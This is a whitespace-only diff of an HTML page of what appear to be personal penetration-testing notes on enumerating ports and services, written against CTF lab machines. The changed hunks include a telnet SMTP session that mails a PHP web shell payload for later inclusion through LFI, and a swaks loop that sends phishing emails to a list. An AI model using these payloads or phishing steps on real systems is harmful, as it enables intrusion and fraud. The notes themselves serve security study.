@@ -4,9 +4,8 @@
     <a href="https://pusher91.github.io/Blog/">Return to Main Page</a>
 </head>
 
-<hr>
-
 <body>
+
 
     <h1>Enumerating Ports & Services</h1>
 
@@ -230,26 +229,26 @@
             <li>On internal networks you can typically send emails as anybody</li>
             <li>SMTP poisoning
                 <pre>
-telnet 10.0.0.12 25
-Trying 10.0.0.12...
-Connected to 10.0.0.12.
-Escape character is '^]'.
-220 symfonos.localdomain ESMTP Postfix (Debian/GNU)
-HELO example.com
-250 symfonos.localdomain
-mail from: hacker@example.com
-250 2.1.0 Ok
-rcpt to: helios@symfonos.localdomain
-250 2.1.5 Ok
-data
-354 End data with &lt;CR&gt;&lt;F&gt;.&lt;CR&gt;&lt;LF&gt;
-subject: 
-&lt;?php echo shell_exec($_GET['cmd]); ?&gt;
-.
-250 2.0.0 Ok: queued as 8A6884082B
-quit
-221 2.0.0 Bye
-Connection closed by foreign host.
+                    telnet 10.0.0.12 25
+                    Trying 10.0.0.12...
+                    Connected to 10.0.0.12.
+                    Escape character is '^]'.
+                    220 symfonos.localdomain ESMTP Postfix (Debian/GNU)
+                    HELO example.com
+                    250 symfonos.localdomain
+                    mail from: hacker@example.com
+                    250 2.1.0 Ok
+                    rcpt to: helios@symfonos.localdomain
+                    250 2.1.5 Ok
+                    data
+                    354 End data with &lt;CR&gt;&lt;F&gt;.&lt;CR&gt;&lt;LF&gt;
+                    subject: 
+                    &lt;?php echo shell_exec($_GET['cmd]); ?&gt;
+                    .
+                    250 2.0.0 Ok: queued as 8A6884082B
+                    quit
+                    221 2.0.0 Bye
+                    Connection closed by foreign host.
                 </pre>
             </li>
             <li>LFI - /var/mail/&lt;username&gt;?cmd=&lt;command&gt;</li>
@@ -284,16 +283,16 @@ Connection closed by foreign host.
                             <tr>Bash script to send emails to a list</tr>
                             <tr>
                                 <pre>
-for email in $(cat email.lst);
-do
-    swaks \
-        --from support@sneakymailer.htb \
-        --to $email \
-        --header 'Subject: Please Register Your Account' \
-        --body 'http://&lt;ip address&gt;/test' \
-        --server sneakymailer.htb
-done;
-                            </pre>
+                                    for email in $(cat email.lst);
+                                    do
+                                    swaks \
+                                    --from support@sneakymailer.htb \
+                                    --to $email \
+                                    --header 'Subject: Please Register Your Account' \
+                                    --body 'http://&lt;ip address&gt;/test' \
+                                    --server sneakymailer.htb
+                                    done;
+                                </pre>
                             </tr>
                         </tr>
                     </table>
@@ -1082,7 +1081,6 @@ done;
         </ul>
     </ul>
 
-
     <h2>443 TCP / HTTPS</h2>
 
     <li>Secure version of port 80.  Most of the same things apply</li>
@@ -1362,6 +1360,7 @@ done;
         </tr>
     </table>
 
+
     <h2>464 TCP / kpasswd5</h2>
     <li>Used for changing/setting passwords against Active Directory.</li>
     <br>
@@ -1505,7 +1504,6 @@ conn conceal
             </ul>
         </ul>
     </ul>
-
 
     <h2>636 TCP / LDAPS</h2>
     <li>LDAP SSL connection</li>
@@ -2226,7 +2224,7 @@ if __name__ == &#039;__main__&#039;:
             </ul>
         </ul>
     </ul>
-    
-</body>
-</html>
 
+</body>
+
+</html>
